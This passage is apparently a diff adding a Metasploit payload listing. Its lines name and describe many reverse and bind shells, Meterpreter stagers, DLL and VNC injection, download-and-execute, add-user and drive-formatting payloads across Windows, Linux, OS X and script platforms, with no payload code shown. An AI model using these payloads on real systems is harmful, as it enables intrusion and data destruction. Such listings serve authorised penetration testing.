+   linux/x86/shell/reverse_tcp_uuid                                     normal  Linux Command Shell, Reverse TCP Stager
+   linux/x86/shell_bind_ipv6_tcp                                        normal  Linux Command Shell, Bind TCP Inline (IPv6)
+   linux/x86/shell_bind_tcp                                             normal  Linux Command Shell, Bind TCP Inline
+   linux/x86/shell_bind_tcp_random_port                                 normal  Linux Command Shell, Bind TCP Random Port Inline
+   linux/x86/shell_find_port                                            normal  Linux Command Shell, Find Port Inline
+   linux/x86/shell_find_tag                                             normal  Linux Command Shell, Find Tag Inline
+   linux/x86/shell_reverse_tcp                                          normal  Linux Command Shell, Reverse TCP Inline
+   linux/zarch/meterpreter_reverse_http                                 normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/zarch/meterpreter_reverse_https                                normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/zarch/meterpreter_reverse_tcp                                  normal  Linux Meterpreter, Reverse TCP Inline
+   mainframe/shell_reverse_tcp                                          normal  Z/OS (MVS) Command Shell, Reverse TCP Inline
+   multi/meterpreter/reverse_http                                       normal  Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Mulitple Architectures)
+   multi/meterpreter/reverse_https                                      normal  Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Mulitple Architectures)
+   netware/shell/reverse_tcp                                            normal  NetWare Command Shell, Reverse TCP Stager
+   nodejs/shell_bind_tcp                                                normal  Command Shell, Bind TCP (via nodejs)
+   nodejs/shell_reverse_tcp                                             normal  Command Shell, Reverse TCP (via nodejs)
+   nodejs/shell_reverse_tcp_ssl                                         normal  Command Shell, Reverse TCP SSL (via nodejs)
+   osx/armle/execute/bind_tcp                                           normal  OS X Write and Execute Binary, Bind TCP Stager
+   osx/armle/execute/reverse_tcp                                        normal  OS X Write and Execute Binary, Reverse TCP Stager
+   osx/armle/shell/bind_tcp                                             normal  OS X Command Shell, Bind TCP Stager
+   osx/armle/shell/reverse_tcp                                          normal  OS X Command Shell, Reverse TCP Stager
+   osx/armle/shell_bind_tcp                                             normal  Apple iOS Command Shell, Bind TCP Inline
+   osx/armle/shell_reverse_tcp                                          normal  Apple iOS Command Shell, Reverse TCP Inline
+   osx/armle/vibrate                                                    normal  Apple iOS iPhone Vibrate
+   osx/ppc/shell/bind_tcp                                               normal  OS X Command Shell, Bind TCP Stager
+   osx/ppc/shell/find_tag                                               normal  OS X Command Shell, Find Tag Stager
+   osx/ppc/shell/reverse_tcp                                            normal  OS X Command Shell, Reverse TCP Stager
+   osx/ppc/shell_bind_tcp                                               normal  OS X Command Shell, Bind TCP Inline
+   osx/ppc/shell_reverse_tcp                                            normal  OS X Command Shell, Reverse TCP Inline
+   osx/x64/dupandexecve/bind_tcp                                        normal  OS X dup2 Command Shell, Bind TCP Stager
+   osx/x64/dupandexecve/reverse_tcp                                     normal  OS X dup2 Command Shell, Reverse TCP Stager
+   osx/x64/exec                                                         normal  OS X x64 Execute Command
+   osx/x64/meterpreter/bind_tcp                                         normal  OSX Meterpreter, Bind TCP Stager
+   osx/x64/meterpreter/reverse_tcp                                      normal  OSX Meterpreter, Reverse TCP Stager
+   osx/x64/meterpreter_reverse_http                                     normal  OSX Meterpreter, Reverse HTTP Inline
+   osx/x64/meterpreter_reverse_https                                    normal  OSX Meterpreter, Reverse HTTPS Inline
+   osx/x64/meterpreter_reverse_tcp                                      normal  OSX Meterpreter, Reverse TCP Inline
+   osx/x64/say                                                          normal  OS X x64 say Shellcode
+   osx/x64/shell_bind_tcp                                               normal  OS X x64 Shell Bind TCP
+   osx/x64/shell_find_tag                                               normal  OSX Command Shell, Find Tag Inline
+   osx/x64/shell_reverse_tcp                                            normal  OS X x64 Shell Reverse TCP
+   osx/x86/bundleinject/bind_tcp                                        normal  Mac OS X Inject Mach-O Bundle, Bind TCP Stager
+   osx/x86/bundleinject/reverse_tcp                                     normal  Mac OS X Inject Mach-O Bundle, Reverse TCP Stager
+   osx/x86/exec                                                         normal  OS X Execute Command
+   osx/x86/isight/bind_tcp                                              normal  Mac OS X x86 iSight Photo Capture, Bind TCP Stager
+   osx/x86/isight/reverse_tcp                                           normal  Mac OS X x86 iSight Photo Capture, Reverse TCP Stager
+   osx/x86/shell_bind_tcp                                               normal  OS X Command Shell, Bind TCP Inline
+   osx/x86/shell_find_port                                              normal  OS X Command Shell, Find Port Inline
+   osx/x86/shell_reverse_tcp                                            normal  OS X Command Shell, Reverse TCP Inline
+   osx/x86/vforkshell/bind_tcp                                          normal  OS X (vfork) Command Shell, Bind TCP Stager
+   osx/x86/vforkshell/reverse_tcp                                       normal  OS X (vfork) Command Shell, Reverse TCP Stager
+   osx/x86/vforkshell_bind_tcp                                          normal  OS X (vfork) Command Shell, Bind TCP Inline
+   osx/x86/vforkshell_reverse_tcp                                       normal  OS X (vfork) Command Shell, Reverse TCP Inline
+   php/bind_perl                                                        normal  PHP Command Shell, Bind TCP (via Perl)
+   php/bind_perl_ipv6                                                   normal  PHP Command Shell, Bind TCP (via perl) IPv6
+   php/bind_php                                                         normal  PHP Command Shell, Bind TCP (via PHP)
+   php/bind_php_ipv6                                                    normal  PHP Command Shell, Bind TCP (via php) IPv6
+   php/download_exec                                                    normal  PHP Executable Download and Execute
+   php/exec                                                             normal  PHP Execute Command 
+   php/meterpreter/bind_tcp                                             normal  PHP Meterpreter, Bind TCP Stager
+   php/meterpreter/bind_tcp_ipv6                                        normal  PHP Meterpreter, Bind TCP Stager IPv6
+   php/meterpreter/bind_tcp_ipv6_uuid                                   normal  PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
+   php/meterpreter/bind_tcp_uuid                                        normal  PHP Meterpreter, Bind TCP Stager with UUID Support
+   php/meterpreter/reverse_tcp                                          normal  PHP Meterpreter, PHP Reverse TCP Stager
+   php/meterpreter/reverse_tcp_uuid                                     normal  PHP Meterpreter, PHP Reverse TCP Stager
+   php/meterpreter_reverse_tcp                                          normal  PHP Meterpreter, Reverse TCP Inline
+   php/reverse_perl                                                     normal  PHP Command, Double Reverse TCP Connection (via Perl)
+   php/reverse_php                                                      normal  PHP Command Shell, Reverse TCP (via PHP)
+   php/shell_findsock                                                   normal  PHP Command Shell, Find Sock
+   python/meterpreter/bind_tcp                                          normal  Python Meterpreter, Python Bind TCP Stager
+   python/meterpreter/bind_tcp_uuid                                     normal  Python Meterpreter, Python Bind TCP Stager with UUID Support
+   python/meterpreter/reverse_http                                      normal  Python Meterpreter, Python Reverse HTTP Stager
+   python/meterpreter/reverse_https                                     normal  Python Meterpreter, Python Reverse HTTPS Stager
+   python/meterpreter/reverse_tcp                                       normal  Python Meterpreter, Python Reverse TCP Stager
+   python/meterpreter/reverse_tcp_ssl                                   normal  Python Meterpreter, Python Reverse TCP SSL Stager
+   python/meterpreter/reverse_tcp_uuid                                  normal  Python Meterpreter, Python Reverse TCP Stager with UUID Support
+   python/meterpreter_bind_tcp                                          normal  Python Meterpreter Shell, Bind TCP Inline
+   python/meterpreter_reverse_http                                      normal  Python Meterpreter Shell, Reverse HTTP Inline
+   python/meterpreter_reverse_https                                     normal  Python Meterpreter Shell, Reverse HTTPS Inline
+   python/meterpreter_reverse_tcp                                       normal  Python Meterpreter Shell, Reverse TCP Inline
+   python/shell_bind_tcp                                                normal  Command Shell, Bind TCP (via python)
+   python/shell_reverse_tcp                                             normal  Command Shell, Reverse TCP (via python)
+   python/shell_reverse_tcp_ssl                                         normal  Command Shell, Reverse TCP SSL (via python)
+   python/shell_reverse_udp                                             normal  Command Shell, Reverse UDP (via python)
+   r/shell_bind_tcp                                                     normal  R Command Shell, Bind TCP
+   r/shell_reverse_tcp                                                  normal  R Command Shell, Reverse TCP
+   ruby/shell_bind_tcp                                                  normal  Ruby Command Shell, Bind TCP
+   ruby/shell_bind_tcp_ipv6                                             normal  Ruby Command Shell, Bind TCP IPv6
+   ruby/shell_reverse_tcp                                               normal  Ruby Command Shell, Reverse TCP
+   ruby/shell_reverse_tcp_ssl                                           normal  Ruby Command Shell, Reverse TCP SSL
+   solaris/sparc/shell_bind_tcp                                         normal  Solaris Command Shell, Bind TCP Inline
+   solaris/sparc/shell_find_port                                        normal  Solaris Command Shell, Find Port Inline
+   solaris/sparc/shell_reverse_tcp                                      normal  Solaris Command Shell, Reverse TCP Inline
+   solaris/x86/shell_bind_tcp                                           normal  Solaris Command Shell, Bind TCP Inline
+   solaris/x86/shell_find_port                                          normal  Solaris Command Shell, Find Port Inline
+   solaris/x86/shell_reverse_tcp                                        normal  Solaris Command Shell, Reverse TCP Inline
+   tty/unix/interact                                                    normal  Unix TTY, Interact with Established Connection
+   windows/adduser                                                      normal  Windows Execute net user /ADD
+   windows/dllinject/bind_hidden_ipknock_tcp                            normal  Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
+   windows/dllinject/bind_hidden_tcp                                    normal  Reflective DLL Injection, Hidden Bind TCP Stager
+   windows/dllinject/bind_ipv6_tcp                                      normal  Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
+   windows/dllinject/bind_ipv6_tcp_uuid                                 normal  Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/dllinject/bind_nonx_tcp                                      normal  Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
+   windows/dllinject/bind_tcp                                           normal  Reflective DLL Injection, Bind TCP Stager (Windows x86)
+   windows/dllinject/bind_tcp_rc4                                       normal  Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/dllinject/bind_tcp_uuid                                      normal  Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
+   windows/dllinject/find_tag                                           normal  Reflective DLL Injection, Find Tag Ordinal Stager
+   windows/dllinject/reverse_hop_http                                   normal  Reflective DLL Injection, Reverse Hop HTTP/HTTPS Stager
+   windows/dllinject/reverse_http                                       normal  Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)
+   windows/dllinject/reverse_http_proxy_pstore                          normal  Reflective DLL Injection, Reverse HTTP Stager Proxy
+   windows/dllinject/reverse_ipv6_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (IPv6)
+   windows/dllinject/reverse_nonx_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
+   windows/dllinject/reverse_ord_tcp                                    normal  Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/dllinject/reverse_tcp                                        normal  Reflective DLL Injection, Reverse TCP Stager
+   windows/dllinject/reverse_tcp_allports                               normal  Reflective DLL Injection, Reverse All-Port TCP Stager
+   windows/dllinject/reverse_tcp_dns                                    normal  Reflective DLL Injection, Reverse TCP Stager (DNS)
+   windows/dllinject/reverse_tcp_rc4                                    normal  Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/dllinject/reverse_tcp_rc4_dns                                normal  Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   windows/dllinject/reverse_tcp_uuid                                   normal  Reflective DLL Injection, Reverse TCP Stager with UUID Support
+   windows/dllinject/reverse_udp                                        normal  Reflective DLL Injection, Reverse UDP Stager with UUID Support
+   windows/dllinject/reverse_winhttp                                    normal  Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)
+   windows/dns_txt_query_exec                                           normal  DNS TXT Record Payload Download and Execution
+   windows/download_exec                                                normal  Windows Executable Download (http,https,ftp) and Execute
+   windows/exec                                                         normal  Windows Execute Command
+   windows/format_all_drives                                            manual  Windows Drive Formatter
+   windows/loadlibrary                                                  normal  Windows LoadLibrary Path
+   windows/messagebox                                                   normal  Windows MessageBox
+   windows/meterpreter/bind_hidden_ipknock_tcp                          normal  Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   windows/meterpreter/bind_hidden_tcp                                  normal  Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
+   windows/meterpreter/bind_ipv6_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/meterpreter/bind_ipv6_tcp_uuid                               normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/meterpreter/bind_nonx_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   windows/meterpreter/bind_tcp                                         normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
+   windows/meterpreter/bind_tcp_rc4                                     normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/meterpreter/bind_tcp_uuid                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/meterpreter/find_tag                                         normal  Windows Meterpreter (Reflective Injection), Find Tag Ordinal Stager
+   windows/meterpreter/reverse_hop_http                                 normal  Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
+   windows/meterpreter/reverse_http                                     normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   windows/meterpreter/reverse_http_proxy_pstore                        normal  Windows Meterpreter (Reflective Injection), Reverse HTTP Stager Proxy
+   windows/meterpreter/reverse_https                                    normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
+   windows/meterpreter/reverse_https_proxy                              normal  Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy
+   windows/meterpreter/reverse_ipv6_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
+   windows/meterpreter/reverse_named_pipe                               normal  Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
+   windows/meterpreter/reverse_nonx_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   windows/meterpreter/reverse_ord_tcp                                  normal  Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+   windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
+   windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
+   windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/meterpreter/reverse_tcp_rc4_dns                              normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
+   windows/meterpreter/reverse_udp                                      normal  Windows Meterpreter (Reflective Injection), Reverse UDP Stager with UUID Support
+   windows/meterpreter/reverse_winhttp                                  normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+   windows/meterpreter/reverse_winhttps                                 normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)
+   windows/meterpreter_bind_named_pipe                                  normal  Windows Meterpreter Shell, Bind Named Pipe Inline
+   windows/meterpreter_bind_tcp                                         normal  Windows Meterpreter Shell, Bind TCP Inline
+   windows/meterpreter_reverse_http                                     normal  Windows Meterpreter Shell, Reverse HTTP Inline
+   windows/meterpreter_reverse_https                                    normal  Windows Meterpreter Shell, Reverse HTTPS Inline
+   windows/meterpreter_reverse_ipv6_tcp                                 normal  Windows Meterpreter Shell, Reverse TCP Inline (IPv6)
+   windows/meterpreter_reverse_tcp                                      normal  Windows Meterpreter Shell, Reverse TCP Inline
+   windows/metsvc_bind_tcp                                              normal  Windows Meterpreter Service, Bind TCP
+   windows/metsvc_reverse_tcp                                           normal  Windows Meterpreter Service, Reverse TCP Inline
+   windows/patchupdllinject/bind_hidden_ipknock_tcp                     normal  Windows Inject DLL, Hidden Bind Ipknock TCP Stager
+   windows/patchupdllinject/bind_hidden_tcp                             normal  Windows Inject DLL, Hidden Bind TCP Stager
+   windows/patchupdllinject/bind_ipv6_tcp                               normal  Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)
+   windows/patchupdllinject/bind_ipv6_tcp_uuid                          normal  Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/patchupdllinject/bind_nonx_tcp                               normal  Windows Inject DLL, Bind TCP Stager (No NX or Win7)
+   windows/patchupdllinject/bind_tcp                                    normal  Windows Inject DLL, Bind TCP Stager (Windows x86)
+   windows/patchupdllinject/bind_tcp_rc4                                normal  Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/patchupdllinject/bind_tcp_uuid                               normal  Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)
+   windows/patchupdllinject/find_tag                                    normal  Windows Inject DLL, Find Tag Ordinal Stager
+   windows/patchupdllinject/reverse_ipv6_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (IPv6)
+   windows/patchupdllinject/reverse_nonx_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
+   windows/patchupdllinject/reverse_ord_tcp                             normal  Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/patchupdllinject/reverse_tcp                                 normal  Windows Inject DLL, Reverse TCP Stager
+   windows/patchupdllinject/reverse_tcp_allports                        normal  Windows Inject DLL, Reverse All-Port TCP Stager
+   windows/patchupdllinject/reverse_tcp_dns                             normal  Windows Inject DLL, Reverse TCP Stager (DNS)
+   windows/patchupdllinject/reverse_tcp_rc4                             normal  Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/patchupdllinject/reverse_tcp_rc4_dns                         normal  Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   windows/patchupdllinject/reverse_tcp_uuid                            normal  Windows Inject DLL, Reverse TCP Stager with UUID Support
+   windows/patchupdllinject/reverse_udp                                 normal  Windows Inject DLL, Reverse UDP Stager with UUID Support
+   windows/patchupmeterpreter/bind_hidden_ipknock_tcp                   normal  Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager
+   windows/patchupmeterpreter/bind_hidden_tcp                           normal  Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager
+   windows/patchupmeterpreter/bind_ipv6_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/patchupmeterpreter/bind_ipv6_tcp_uuid                        normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/patchupmeterpreter/bind_nonx_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/bind_tcp                                  normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)
+   windows/patchupmeterpreter/bind_tcp_rc4                              normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/patchupmeterpreter/bind_tcp_uuid                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/patchupmeterpreter/find_tag                                  normal  Windows Meterpreter (skape/jt Injection), Find Tag Ordinal Stager
+   windows/patchupmeterpreter/reverse_ipv6_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)
+   windows/patchupmeterpreter/reverse_nonx_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/reverse_ord_tcp                           normal  Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/reverse_tcp                               normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
+   windows/patchupmeterpreter/reverse_tcp_allports                      normal  Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
+   windows/patchupmeterpreter/reverse_tcp_dns                           normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
+   windows/patchupmeterpreter/reverse_tcp_rc4                           normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/patchupmeterpreter/reverse_tcp_rc4_dns                       normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   windows/patchupmeterpreter/reverse_tcp_uuid                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
+   windows/patchupmeterpreter/reverse_udp                               normal  Windows Meterpreter (skape/jt Injection), Reverse UDP Stager with UUID Support
+   windows/powershell_bind_tcp                                          normal  Windows Interactive Powershell Session, Bind TCP
+   windows/powershell_reverse_tcp                                       normal  Windows Interactive Powershell Session, Reverse TCP
+   windows/shell/bind_hidden_ipknock_tcp                                normal  Windows Command Shell, Hidden Bind Ipknock TCP Stager
+   windows/shell/bind_hidden_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Stager
+   windows/shell/bind_ipv6_tcp                                          normal  Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)
+   windows/shell/bind_ipv6_tcp_uuid                                     normal  Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/shell/bind_nonx_tcp                                          normal  Windows Command Shell, Bind TCP Stager (No NX or Win7)
+   windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager (Windows x86)
+   windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
+   windows/shell/find_tag                                               normal  Windows Command Shell, Find Tag Ordinal Stager
+   windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (IPv6)
+   windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)
+   windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager
+   windows/shell/reverse_tcp_allports                                   normal  Windows Command Shell, Reverse All-Port TCP Stager
+   windows/shell/reverse_tcp_dns                                        normal  Windows Command Shell, Reverse TCP Stager (DNS)
+   windows/shell/reverse_tcp_rc4                                        normal  Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/shell/reverse_tcp_rc4_dns                                    normal  Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   windows/shell/reverse_tcp_uuid                                       normal  Windows Command Shell, Reverse TCP Stager with UUID Support
+   windows/shell/reverse_udp                                            normal  Windows Command Shell, Reverse UDP Stager with UUID Support
+   windows/shell_bind_tcp                                               normal  Windows Command Shell, Bind TCP Inline
+   windows/shell_bind_tcp_xpfw                                          normal  Windows Disable Windows ICF, Command Shell, Bind TCP Inline
+   windows/shell_hidden_bind_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Inline
+   windows/shell_reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Inline
+   windows/speak_pwned                                                  normal  Windows Speech API - Say "You Got Pwned!"
+   windows/upexec/bind_hidden_ipknock_tcp                               normal  Windows Upload/Execute, Hidden Bind Ipknock TCP Stager
+   windows/upexec/bind_hidden_tcp                                       normal  Windows Upload/Execute, Hidden Bind TCP Stager
+   windows/upexec/bind_ipv6_tcp                                         normal  Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)
+   windows/upexec/bind_ipv6_tcp_uuid                                    normal  Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/upexec/bind_nonx_tcp                                         normal  Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
+   windows/upexec/bind_tcp                                              normal  Windows Upload/Execute, Bind TCP Stager (Windows x86)
+   windows/upexec/bind_tcp_rc4                                          normal  Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/upexec/bind_tcp_uuid                                         normal  Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)
+   windows/upexec/find_tag                                              normal  Windows Upload/Execute, Find Tag Ordinal Stager
+   windows/upexec/reverse_ipv6_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (IPv6)
+   windows/upexec/reverse_nonx_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
+   windows/upexec/reverse_ord_tcp                                       normal  Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/upexec/reverse_tcp                                           normal  Windows Upload/Execute, Reverse TCP Stager
+   windows/upexec/reverse_tcp_allports                                  normal  Windows Upload/Execute, Reverse All-Port TCP Stager
+   windows/upexec/reverse_tcp_dns                                       normal  Windows Upload/Execute, Reverse TCP Stager (DNS)
+   windows/upexec/reverse_tcp_rc4                                       normal  Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/upexec/reverse_tcp_rc4_dns                                   normal  Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   windows/upexec/reverse_tcp_uuid                                      normal  Windows Upload/Execute, Reverse TCP Stager with UUID Support
+   windows/upexec/reverse_udp                                           normal  Windows Upload/Execute, Reverse UDP Stager with UUID Support
+   windows/vncinject/bind_hidden_ipknock_tcp                            normal  VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   windows/vncinject/bind_hidden_tcp                                    normal  VNC Server (Reflective Injection), Hidden Bind TCP Stager
+   windows/vncinject/bind_ipv6_tcp                                      normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/vncinject/bind_ipv6_tcp_uuid                                 normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/vncinject/bind_nonx_tcp                                      normal  VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   windows/vncinject/bind_tcp                                           normal  VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
+   windows/vncinject/bind_tcp_rc4                                       normal  VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/vncinject/bind_tcp_uuid                                      normal  VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/vncinject/find_tag                                           normal  VNC Server (Reflective Injection), Find Tag Ordinal Stager
+   windows/vncinject/reverse_hop_http                                   normal  VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
+   windows/vncinject/reverse_http                                       normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   windows/vncinject/reverse_http_proxy_pstore                          normal  VNC Server (Reflective Injection), Reverse HTTP Stager Proxy
+   windows/vncinject/reverse_ipv6_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
+   windows/vncinject/reverse_nonx_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   windows/vncinject/reverse_ord_tcp                                    normal  VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/vncinject/reverse_tcp                                        normal  VNC Server (Reflective Injection), Reverse TCP Stager
+   windows/vncinject/reverse_tcp_allports                               normal  VNC Server (Reflective Injection), Reverse All-Port TCP Stager
+   windows/vncinject/reverse_tcp_dns                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
+   windows/vncinject/reverse_tcp_rc4                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/vncinject/reverse_tcp_rc4_dns                                normal  VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   windows/vncinject/reverse_tcp_uuid                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
+   windows/vncinject/reverse_udp                                        normal  VNC Server (Reflective Injection), Reverse UDP Stager with UUID Support
+   windows/vncinject/reverse_winhttp                                    normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+   windows/x64/exec                                                     normal  Windows x64 Execute Command
+   windows/x64/loadlibrary                                              normal  Windows x64 LoadLibrary Path
+   windows/x64/meterpreter/bind_ipv6_tcp                                normal  Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
+   windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
+   windows/x64/meterpreter/bind_named_pipe                              normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
+   windows/x64/meterpreter/bind_tcp                                     normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
+   windows/x64/meterpreter/bind_tcp_uuid                                normal  Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
+   windows/x64/meterpreter/reverse_http                                 normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+   windows/x64/meterpreter/reverse_https                                normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+   windows/x64/meterpreter/reverse_named_pipe                           normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
+   windows/x64/meterpreter/reverse_tcp                                  normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+   windows/x64/meterpreter/reverse_tcp_uuid                             normal  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+   windows/x64/meterpreter/reverse_winhttp                              normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
